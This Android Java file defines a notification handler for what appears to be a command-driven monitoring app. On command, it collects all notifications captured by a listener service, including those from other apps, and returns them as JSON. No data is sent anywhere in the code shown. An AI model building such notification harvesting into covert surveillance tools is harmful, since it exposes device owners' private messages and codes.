package com.idsiber.eye.handlers;

import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.util.Log;

import com.idsiber.eye.CommandResult;
import com.idsiber.eye.IdSiberNotificationListener;

import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Handler untuk manajemen notifikasi
 */
public class NotificationHandler {
    private static final String TAG = "NotificationHandler";
    private Context context;

    public NotificationHandler(Context context) {
        this.context = context;
    }

    public CommandResult getNotifications() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
                return new CommandResult(false, "Notification access requires Android 4.3+", null);
            }

            // Check if notification listener service is enabled
            if (!isNotificationServiceEnabled()) {
                return new CommandResult(false, "Notification listener service not enabled. Please enable it in device settings.", null);
            }
            
            // Check if our listener is active
            if (!IdSiberNotificationListener.isNotificationListenerEnabled()) {
                return new CommandResult(false, "Notification listener service is enabled but not active. Try restarting the app.", null);
            }
            
            // Get notifications from the listener service
            JSONArray notifications = IdSiberNotificationListener.getAllNotifications();
            
            // Return the results
            JSONObject result = new JSONObject();
            result.put("count", notifications.length());
            result.put("notifications", notifications);
            
            return new CommandResult(true, "Notifications retrieved successfully", result.toString());
            
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get notifications: " + e.getMessage(), null);
        }
    }
    
    /**
     * Check if notification listener service is enabled in system settings
     */
    private boolean isNotificationServiceEnabled() {
        String packageName = context.getPackageName();
        final String flat = Settings.Secure.getString(context.getContentResolver(),
                "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName componentName = ComponentName.unflattenFromString(name);
                if (componentName != null && TextUtils.equals(packageName, componentName.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }
    
    /**
     * Open notification listener settings
     */
    public CommandResult openNotificationSettings() {
        try {
            Intent intent = new Intent();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                intent.setAction(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            } else {
                intent.setAction("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            }
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return new CommandResult(true, "Notification settings opened", null);
        } catch (Exception e) {
            return new CommandResult(false, "Failed to open notification settings: " + e.getMessage(), null);
        }
    }

    public CommandResult clearNotifications() {
        try {
            NotificationManager notificationManager = (NotificationManager) 
                context.getSystemService(Context.NOTIFICATION_SERVICE);
            
            if (notificationManager == null) {
                return new CommandResult(false, "NotificationManager not available", null);
            }

            // Clear all notifications posted by this app
            notificationManager.cancelAll();
            
            return new CommandResult(true, "App notifications cleared", null);
        } catch (Exception e) {
            return new CommandResult(false, "Failed to clear notifications: " + e.getMessage(), null);
        }
    }
}
